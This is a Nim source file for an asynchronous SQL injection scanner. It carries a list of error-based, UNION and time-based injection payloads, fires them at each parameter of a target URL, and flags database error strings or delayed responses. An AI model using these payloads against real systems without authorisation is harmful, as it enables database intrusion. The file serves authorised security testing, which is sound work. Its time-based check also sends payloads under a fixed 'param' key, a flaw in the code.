import asyncdispatch 
import std/[httpclient, uri, strutils, options, tables, sequtils, times, httpcore]
import types

# Common SQL injection payloads
const payloads = @[
  # Basic tests
  "'",
  "1' OR '1'='1",
  "1 OR 1=1",
  "'--",
  "' #",
  # Union-based tests
  "1' UNION SELECT NULL--",
  "1' ORDER BY 1--",
  "1' GROUP BY 1,2--",
  "') OR ('1'='1",
  # Time-based tests
  "1' AND SLEEP(5)--",
  "1' WAITFOR DELAY '0:0:5'--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
  "1' AND IF(TRUE,SLEEP(5),0)--"
]

proc testInjection(response: string): tuple[vulnerable: bool, injType: InjectionType] =
  if "error in your SQL syntax" in response or
     "mysql_fetch_array()" in response or
     "ORA-" in response or
     "SQL syntax" in response:
    result = (true, InjectionType.Error)
  elif "UNION SELECT" in response:
    result = (true, InjectionType.Union)
  else:
    result = (false, InjectionType.Error)  # Use explicit enum value

proc testTimeBasedInjection(client: AsyncHttpClient, url: string, payload: string): Future[bool] {.async.} =
  let startTime = getTime()  # Use getTime() instead of epochTime
  try:
    discard await client.get(url & "?" & encodeQuery({"param": payload}))
    let endTime = getTime()
    let duration = endTime - startTime
    return duration > initDuration(seconds = 5)  # Compare Durations directly
  except:
    return false

proc scanParameter*(target: ScanTarget, param: string): Future[ScanResult] {.async.} =
  echo "Starting scan for parameter: ", param  # Debug
  echo "Target URL: ", target.url  # Debug
  echo "HTTP Method: ", target.httpMethod  # Debug
  
  let client = newAsyncHttpClient()
  defer: client.close()
  
  # Convert timeout only at the API boundary
  client.timeout = int(target.timeout.inMilliseconds())
  
  var result = ScanResult(
    vulnerable: false,
    injectionType: none(InjectionType),
    payload: "",
    parameter: param,
    details: ""
  )

  echo "Testing ", payloads.len, " payloads"  # Debug
  
  for payload in payloads:
    echo "Testing payload: ", payload  # Debug
    var testUrl = target.url
    var modifiedParams = newTable[string, string]()
    
    # Copy existing params and inject payload
    for k, v in pairs(target.params):
      modifiedParams[k] = v
    modifiedParams[param] = payload
    
    if target.httpMethod == HttpGet:
      testUrl = testUrl & "?" & encodeQuery(toSeq(modifiedParams.pairs))
      echo "Test URL: ", testUrl  # Debug
      
    try:
      let response = case target.httpMethod
      of HttpGet: await client.get(testUrl)
      of HttpPost: await client.post(testUrl, body = target.data)
      of HttpPut: await client.put(testUrl, body = target.data)
      of HttpDelete: await client.delete(testUrl)
      else: 
        echo "Error: Unsupported HTTP method: ", target.httpMethod
        return result
        
      let body = await response.body
      let (isVulnerable, injType) = testInjection(body)
      
      if isVulnerable:
        result.vulnerable = true
        result.injectionType = some(injType)
        result.payload = payload
        result.details = "SQL injection vulnerability detected using payload: " & payload
        return result
        
      # Test for time-based injection
      if "SLEEP" in payload.toUpper() and await testTimeBasedInjection(client, target.url, payload):
        result.vulnerable = true
        result.injectionType = some(InjectionType.TimeBased)
        result.payload = payload
        result.details = "Time-based SQL injection detected using payload: " & payload
        return result
          
      # Handle delay between requests
      if target.delay > initDuration():  # Compare with zero duration
        await sleepAsync(int(target.delay.inMilliseconds()))  # Convert only at API boundary
          
    except Exception as e:
      echo "Error testing payload: ", e.msg, " (", e.name, ")"  # Enhanced error message
      continue
      
  return result

proc scan*(target: ScanTarget): Future[seq[ScanResult]] {.async.} =
  var results: seq[ScanResult] = @[]
  
  # Test each parameter
  for param in target.params.keys:
    let result = await scanParameter(target, param)
    if result.vulnerable:
      results.add(result)
      
  return results

